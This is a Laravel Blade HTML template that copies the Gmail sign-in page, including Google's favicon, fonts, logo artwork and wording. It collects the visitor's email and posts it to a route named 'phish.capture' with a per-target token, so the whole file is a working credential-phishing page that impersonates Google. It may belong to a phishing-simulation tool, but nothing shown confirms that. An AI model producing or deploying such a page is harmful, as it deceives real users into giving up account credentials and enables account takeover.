<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Gmail</title>
    <link rel="icon" href="https://accounts.google.com/favicon.ico" type="image/x-icon">
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", "Noto Sans Khmer", arial, sans-serif;
            font-size: 14px;
            font-weight: 400;
            line-height: 20px;
            background: #fff;
            color: #202124;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .main {
            display: flex;
            align-items: flex-start;
            justify-content: center;
            padding: 127px 20px 68px;
        }

        .card {
            width: 100%;
            max-width: 450px;
            padding: 48px 40px 0;
            text-align: left;
        }

        .logo {
            width: 75px;
            height: 24px;
            margin-bottom: 8px;
        }

        .logo svg { height: 24px; width: auto; }

        h1 {
            font-size: 24px;
            font-weight: 400;
            line-height: 48px;
            color: #202124;
            margin-top: 16px;
            margin-bottom: 0;
            text-align: center;
        }

        .subtitle {
            font-size: 16px;
            font-weight: 400;
            line-height: 24px;
            color: #202124;
            margin-bottom: 0;
            text-align: center;
        }

        .form-section {
            margin-top: 16px;
        }

        .input-label {
            display: block;
            position: relative;
            width: 100%;
        }

        .input-label input {
            width: 100%;
            height: 56px;
            padding: 12px 14px 28px;
            font-size: 16px;
            font-family: "Google Sans", roboto, sans-serif;
            color: #202124;
            background: transparent;
            border: 1px solid #747775;
            border-radius: 4px;
            outline: none;
        }

        .input-label input:focus {
            border: 2px solid #1a73e8;
            padding: 11px 13px 27px;
        }

        .input-label .label-text {
            position: absolute;
            left: 14px;
            top: 8px;
            font-size: 12px;
            color: #1a73e8;
            pointer-events: none;
            transition: all 0.15s ease;
        }

        .input-label input:placeholder-shown ~ .label-text {
            top: 16px;
            font-size: 16px;
            color: #5f6368;
        }

        .input-label input:focus ~ .label-text {
            top: 8px;
            font-size: 12px;
            color: #1a73e8;
        }

        .forgot-link {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: #1a73e8;
            text-decoration: none;
            padding: 0;
            margin-top: 16px;
            line-height: 36px;
            border-radius: 4px;
            width: fit-content;
        }

        .forgot-link:hover { text-decoration: underline; }

        .guest-note {
            font-size: 14px;
            color: #5f6368;
            line-height: 20px;
            margin-top: 36px;
            margin-bottom: 0;
        }

        .guest-note a {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
        }

        .guest-note a:hover { text-decoration: underline; }

        .bottom-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-top: 35px;
        }

        .btn-create {
            display: inline-flex;
            align-items: center;
            padding: 0 16px 0 1px;
            height: 36px;
            font-size: 14px;
            font-weight: 500;
            font-family: "Google Sans", roboto, sans-serif;
            color: #1a73e8;
            background: transparent;
            border: none;
            border-radius: 18px;
            cursor: pointer;
            text-decoration: none;
        }

        .btn-create:hover { background: rgba(26, 115, 232, 0.08); }

        .btn-next {
            display: inline-flex;
            align-items: center;
            padding: 0 24px;
            height: 36px;
            font-size: 14px;
            font-weight: 500;
            font-family: "Google Sans", roboto, sans-serif;
            color: #fff;
            background: #1a73e8;
            border: none;
            border-radius: 18px;
            cursor: pointer;
        }

        .btn-next:hover { background: #1765cc; box-shadow: 0 1px 3px rgba(0,0,0,.24); }

        .footer {
            display: flex;
            align-items: center;
            justify-content: flex-end;
            padding: 16px 448px 16px 24px;
            gap: 8px;
        }

        .footer a {
            font-size: 12px;
            font-weight: 400;
            line-height: 16px;
            color: #5f6368;
            text-decoration: none;
            padding: 8px 12px;
            border-radius: 8px;
            display: flex;
            align-items: center;
        }

        .footer a:hover { background: #f1f3f4; }

        @media (max-width: 480px) {
            .card { padding: 32px 24px 0; }
        }
    </style>
</head>
<body>
    <div class="main">
        <div class="card">
            <div class="logo">
                <svg viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
                    <g fill="none">
                        <path d="M0 19.494V4.656h3.816v14.838H0z" fill="#4285F4"/>
                        <path d="M4.482 4.656H8.3v14.838H4.482V4.656z" fill="#34A853"/>
                        <path d="M8.3 4.656h3.594c2.586 0 4.194 1.11 4.194 3.006 0 1.872-1.38 3.072-4.194 3.072H8.3V4.656zm0 4.848h3.246c1.668 0 2.574-.678 2.574-1.836 0-1.176-.906-1.842-2.574-1.842H8.3v3.678z" fill="#EA4335"/>
                        <path d="M14.166 12.582c0 3.126 2.184 4.752 5.022 4.752 1.368 0 2.616-.396 3.546-1.116l-1.572-1.962c-.63.462-1.404.756-2.202.756-1.71 0-2.856-1.068-2.856-2.808 0-1.752 1.146-2.82 2.856-2.82.798 0 1.572.312 2.202.774l1.572-1.962c-.93-.72-2.178-1.122-3.546-1.122-2.838 0-5.022 1.626-5.022 4.74v.864z" fill="#4285F4"/>
                        <path d="M24.966 12.582c0-3.078-2.184-4.74-4.938-4.74-2.76 0-4.938 1.662-4.938 4.74 0 3.06 2.178 4.74 4.938 4.74 2.754 0 4.938-1.68 4.938-4.74zm-8.028 0c0-1.836 1.236-2.832 3.09-2.832 1.854 0 3.09.996 3.09 2.832 0 1.848-1.236 2.832-3.09 2.832-1.854 0-3.09-.984-3.09-2.832z" fill="#FBBC05"/>
                        <path d="M31.254 5.004v13.47H28.4V5.004h2.854z" fill="#34A853"/>
                        <path d="M36.93 5.004v13.47h-2.85V5.004h2.85z" fill="#EA4335"/>
                        <path d="M42.606 12.582c0-3.078-2.184-4.74-4.938-4.74-2.76 0-4.938 1.662-4.938 4.74 0 3.06 2.178 4.74 4.938 4.74 2.754 0 4.938-1.68 4.938-4.74zm-8.028 0c0-1.836 1.236-2.832 3.09-2.832 1.854 0 3.09.996 3.09 2.832 0 1.848-1.236 2.832-3.09 2.832-1.854 0-3.09-.984-3.09-2.832z" fill="#4285F4"/>
                        <path d="M48.018 5.004v13.47h-2.85V5.004h2.85z" fill="#FBBC05"/>
                        <path d="M53.694 12.582c0-3.078-2.184-4.74-4.938-4.74-2.76 0-4.938 1.662-4.938 4.74 0 3.06 2.178 4.74 4.938 4.74 2.754 0 4.938-1.68 4.938-4.74zm-8.028 0c0-1.836 1.236-2.832 3.09-2.832 1.854 0 3.09.996 3.09 2.832 0 1.848-1.236 2.832-3.09 2.832-1.854 0-3.09-.984-3.09-2.832z" fill="#34A853"/>
                        <path d="M57.552 5.004h2.85l4.71 11.04V5.004h2.73v13.47h-2.628L59.88 7.044v11.43h-2.328V5.004z" fill="#EA4335"/>
                        <path d="M71.142 5.778c1.308 0 2.37.396 3.186 1.188l-1.638 1.638c-.498-.45-1.11-.678-1.812-.678-1.47 0-2.55 1.152-2.55 2.724 0 1.584 1.08 2.736 2.55 2.736.702 0 1.314-.228 1.812-.678l1.638 1.638c-.816.792-1.878 1.188-3.186 1.188-2.64 0-4.77-1.932-4.77-4.872 0-2.94 2.13-4.872 4.77-4.872z" fill="#4285F4"/>
                    </g>
                </svg>
            </div>

            <h1>Sign in</h1>
            <p class="subtitle">to continue to Gmail</p>

            <div class="form-section">
                <form action="{{ route('phish.capture', ['provider' => 'google', 'token' => $token]) }}" method="POST" autocomplete="off">
                    @csrf

                    <label class="input-label">
                        <input type="text" id="identifierId" name="identifier" placeholder=" " autocomplete="username webauthn" value="{{ $email ?? '' }}">
                        <span class="label-text">Email or phone</span>
                    </label>

                    <a href="#" class="forgot-link">Forgot email?</a>

                    <p class="guest-note">Not your computer? Use a private browsing window to sign in. <a href="#">Learn more about using Guest mode</a></p>

                    <div class="bottom-row">
                        <button type="button" class="btn-create">Create account</button>
                        <button type="submit" class="btn-next">Next</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <div class="footer">
        <a href="#">Help</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
    </div>
</body>
</html>
